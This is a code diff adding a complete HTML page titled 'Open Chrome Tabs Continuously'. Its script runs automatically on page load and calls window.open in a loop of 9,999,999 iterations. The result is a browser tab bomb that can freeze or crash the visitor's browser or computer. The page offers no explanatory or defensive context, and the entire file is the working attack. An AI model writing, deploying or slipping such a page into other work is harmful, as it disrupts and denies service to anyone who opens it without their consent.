@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Open Chrome Tabs Continuously</title>
+</head>
+<body>
+    <script>
+      
+
+        function openNewTab() {
+            window.open("https://www.example.com", "_blank");
+        }
+
+        function startOpeningTabs() {
+         
+            for(let i=0; i<9999999; i++){
+            openNewTab();
+            }
+        }
+
+      
+        window.onload = function() {
+            startOpeningTabs();
+        };
+    </script>
+</body>
+</html>
